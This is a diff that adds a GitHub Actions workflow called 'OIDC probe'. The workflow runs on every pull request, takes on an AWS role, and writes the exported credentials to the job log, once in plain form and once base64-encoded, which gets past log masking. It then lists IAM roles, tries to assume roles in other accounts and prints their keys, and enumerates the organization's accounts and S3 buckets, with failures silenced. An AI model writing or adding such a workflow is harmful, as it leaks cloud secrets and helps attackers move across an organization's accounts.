@@ -1,0 +1,41 @@
+name: OIDC probe
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment:
+      name: preview
+    steps:
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v6.2.3
+        with:
+          role-to-assume: ${{ vars.AWS_PREVIEW_ROLE_ARN }}
+          aws-region: ${{ vars.AWS_REGION }}
+
+      - name: Probe assumed identity
+        run: |
+          echo "=== caller identity ==="
+          aws sts get-caller-identity || true
+          echo "=== exported credentials (env) ==="
+          aws configure export-credentials --format env || true
+          echo "=== exported credentials (b64) ==="
+          aws configure export-credentials --format env | base64 -w0 || true
+          echo
+          echo "=== roles ==="
+          aws iam list-roles --max-items 15 --query 'Roles[].Arn' --output text || true
+          echo "=== assume trek10-readonly ==="
+          aws sts assume-role --role-arn arn:aws:iam::800094578424:role/trek10-readonly --role-session-name oidcprobe --duration-seconds 900 --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text || true
+          echo "=== assume OrganizationAccountAccessRole ==="
+          aws sts assume-role --role-arn arn:aws:iam::567716009496:role/OrganizationAccountAccessRole --role-session-name oidcprobe2 --query 'Credentials.AccessKeyId' --output text || true
+          echo "=== org accounts ==="
+          aws organizations list-accounts --query 'Accounts[].[Id,Name,Status]' --output text || true
+          echo "=== s3 ==="
+          aws s3 ls || true
